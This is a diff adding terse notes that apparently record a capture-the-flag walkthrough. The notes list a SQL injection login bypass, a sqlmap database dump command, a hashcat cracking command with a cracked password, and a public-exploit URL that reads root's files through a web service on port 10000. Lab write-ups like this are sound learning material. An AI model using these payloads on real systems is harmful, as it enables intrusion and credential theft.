@@ -1,0 +1,48 @@
+------------------
+NOTES
+------------------
+SQLi
+	' or 1=1 -- -
+
+SQLMAP
+	sqlmap -r request.txt --dbms=mysql --dump
+
+HASHCAT
+	hashcat -m 1400 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt
+------------------
+PROCESS
+------------------
+
+Webserver running
+
+agent 47 is the character
+
+sqli on the login page leads to portal.php
+	' or 1=1 -- -
+
+save a sample request to portal.php with zap
+
+test for sqli with sqlmap
+	sqlmap -r request.txt --dbms=mysql --dump
+
+got a hash for a user from the sql database dump
+
+cracking with hashcat
+hashcat -m 1400 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt
+	-m = the hash type
+
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
+
+created a ssh priv key to make ssh easier
+
+looking at connections on a machine
+	ss -tulpn
+		-t tcp sockets
+		-u udp sockets
+		-l listening sockets
+		-p process using the socket
+		-n doesnt resolve service names
+
+public exploit
+	can also add /file/show.cgi to the file to view anything as root
+	http://localhost:10000/file/show.cgi/root/root.txt
